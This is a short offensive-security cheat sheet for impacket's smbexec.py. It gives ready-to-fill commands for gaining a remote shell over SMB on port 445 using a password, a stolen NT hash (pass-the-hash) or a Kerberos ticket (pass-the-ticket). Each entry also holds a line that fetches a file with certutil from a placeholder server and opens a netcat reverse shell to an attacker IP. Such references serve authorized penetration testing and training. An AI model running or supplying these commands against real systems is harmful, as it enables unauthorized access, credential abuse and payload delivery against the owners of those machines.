# smbexec (imp)

%  windows, impacket-exec, smb


## username
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
upgrade full shell :
    certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe
```
smbexec.py -shell-type powershell '<domain>/<user>:<password>'@<ip>
```

## pth
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
upgrade full shell :
    certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe
```
smbexec.py -shell-type powershell -hashes :<nt_hash> <domain>/<user>@<ip>
```

## ptt
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe
```
export KRB5CCNAME=<ccache>; smbexec.py -shell-type powershell -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <target_name>
```
